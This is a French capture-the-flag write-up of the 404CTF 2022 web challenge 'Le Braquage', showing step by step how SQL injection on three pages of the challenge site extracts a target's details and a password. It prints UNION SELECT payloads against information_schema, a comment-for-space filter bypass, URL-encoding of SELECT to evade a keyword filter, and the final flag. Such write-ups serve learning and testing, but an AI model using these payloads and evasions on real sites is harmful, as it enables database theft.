# Le Braquage

Nous devons extraire un tas d'information sur le criminel **TITI** depuis le site qu'on nous donne !

![alt text](https://github.com/anonylouis/404CTF-2022---Write-ups/blob/main/Web/Le_braquage/index.png)

Les 3 pages disponibles nous fournirons les informations dont on a besoin !

## Discussions

![alt text](https://github.com/anonylouis/404CTF-2022---Write-ups/blob/main/Web/Le_braquage/discussions.png)

Ici une simple requête utilisant OR nous affiche déjà le téléphone et l'adresse de **TITI** !

## Informations

Ici soutirer des informations de la table qu'on nous donne ne nous est pas utile, mais l'on peut essayer d'aller plus loin en regardant si l'on n'a pas accès à une autre table !!

`a' UNION SELECT table_name,column_name FROM information_schema.columns #` affiche :

![alt text](https://github.com/anonylouis/404CTF-2022---Write-ups/blob/main/Web/Le_braquage/informations1.png)

Deux tables ! Si _coopreratives_ n'était pas utile, la table _Users_ peut l'être !

`a' UNION SELECT nom, prenom FROM users #`

![alt text](https://github.com/anonylouis/404CTF-2022---Write-ups/blob/main/Web/Le_braquage/informations2.png)

Et voilà le nom et prénom !

## Rencontres

Ici, si l'on rentre une requête basique `' OR 1=1#`, on nous affiche une formidable erreur : "Requête invalide : ne pas mettre d'espace"

Les espaces sont soumis à un FILTRE ! Pas de soucis le filtre peut être bypass en remplaçant les espaces par "/**/"

![alt text](https://github.com/anonylouis/404CTF-2022---Write-ups/blob/main/Web/Le_braquage/rencontres1.png)

Reste plus qu'à trouver le mot de passe !!

Peut-être se trouve-t-il sur une autre table !

`a'/**/UNION/**/SELECT/**/1,table_name,column_name/**/FROM/**/information_schema.columns#` affiche une nouvelle erreur : "Attaque détectée : SELECT utilisé"

Il faut bypass ce nouveau filtre ! Pour cela, on peut remplacer SELECT par %53%45%4c%45%43%54

`a'/**/UNION/**/%53%45%4c%45%43%54/**/1,table_name,column_name/**/FROM/**/information_schema.columns#`

![alt text](https://github.com/anonylouis/404CTF-2022---Write-ups/blob/main/Web/Le_braquage/rencontres2.png)

Le mot de passe se trouve probablement dans la table Password !

`a'/**/UNION/**/%53%45%4c%45%43%54/**/1,id,mdp/**/FROM/**/Password#`

![alt text](https://github.com/anonylouis/404CTF-2022---Write-ups/blob/main/Web/Le_braquage/rencontres3.png)

Et voilà le dernier élément !

> 404CTF{VereuxUnGorfou014576945621ruedeskiwis2022-07-1401hDuMatinGorfousAuPouvoir}